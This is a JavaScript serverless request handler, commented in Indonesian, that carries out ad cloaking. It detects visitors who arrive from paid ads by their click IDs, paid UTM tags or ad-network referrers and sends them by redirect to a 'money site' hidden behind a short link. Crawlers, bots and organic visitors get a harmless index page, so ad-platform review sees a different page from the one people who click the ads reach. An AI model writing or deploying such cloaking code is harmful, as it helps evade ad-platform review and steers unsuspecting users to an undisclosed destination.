export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const params = url.searchParams;

  // ========= KONFIG =========
  const MONEY_SITE = "https://t.ly/haKWD"; // target redirect
  const FALLBACK = "/index.html"; // fallback page
  // ==========================

  // --- Daftar param iklan ---
  const AD_PARAM_KEYS = [
    "gclid",
    "gclsrc",
    "gad_source",
    "gbraid",
    "wbraid",
    "fbclid",
    "ttclid",
    "msclkid",
    "yclid",
    "twclid",
    "rdt_cid",
    "scid",
    "epik",
    "vero_id",
  ];
  const UTM_SOURCE_HITS = [
    "google",
    "adwords",
    "cpc",
    "ppc",
    "facebook",
    "fb",
    "meta",
    "tiktok",
    "tt",
    "bing",
    "microsoft",
    "yahoo",
    "twitter",
    "x",
    "reddit",
    "snapchat",
    "pinterest",
  ];
  const UTM_MEDIUM_HITS = [
    "cpc",
    "ppc",
    "paid",
    "paid_social",
    "paidsocial",
    "display",
    "remarketing",
    "retargeting",
  ];
  const AD_REF_HOSTS = [
    "google.",
    "ads.google",
    "facebook.com",
    "tiktok.com",
    "bing.com",
    "yahoo.com",
    "twitter.com",
    "x.com",
    "reddit.com",
    "snapchat.com",
    "pinterest.com",
  ];

  // --- Header ---
  const accept = (request.headers.get("accept") || "").toLowerCase();
  const referer = (request.headers.get("referer") || "").toLowerCase();

  // --- Detection ---
  const allKeys = Array.from(params.keys()).map((k) => k.toLowerCase());
  const keyHit = AD_PARAM_KEYS.some((k) => allKeys.includes(k));
  const utmSource = (params.get("utm_source") || "").toLowerCase();
  const utmMedium = (params.get("utm_medium") || "").toLowerCase();
  const utmHit =
    UTM_SOURCE_HITS.includes(utmSource) || UTM_MEDIUM_HITS.includes(utmMedium);
  const refHit = AD_REF_HOSTS.some((sig) => referer.includes(sig));
  const regexHit = /(^|,)([a-z]*clid|click_id)(,|$)/i.test(allKeys.join(","));

  const fromAds = !!(refHit || keyHit || utmHit || regexHit);
  const isNavigation = accept.includes("text/html");

  // Debug info
  if ((params.get("debug") || "") === "1") {
    const info = {
      url: url.toString(),
      referer,
      query: Object.fromEntries(params.entries()),
      signals: { refHit, keyHit, utmHit, regexHit, fromAds },
      decision: isNavigation && fromAds ? "TO_MONEY_SITE" : "SERVE_INDEX",
    };
    return new Response(JSON.stringify(info, null, 2), {
      headers: { "content-type": "application/json; charset=utf-8" },
    });
  }

  // --- MAIN LOGIC ---
  if (isNavigation && fromAds) {
    // Redirect klik iklan ke money site (bawa query string)
    return Response.redirect(MONEY_SITE + (url.search || ""), 302);
  }

  // Kalau asset normal
  try {
    const assetResp = await env.ASSETS.fetch(request);
    if (assetResp && assetResp.status !== 404) return assetResp;
  } catch (e) {
    console.log("ASSETS.fetch error:", e);
  }

  // Default: selalu serve index.html 200 OK (untuk bot, crawler, visitor organik)
  return env.ASSETS.fetch(
    new Request(new URL(FALLBACK, request.url).toString(), request)
  );
}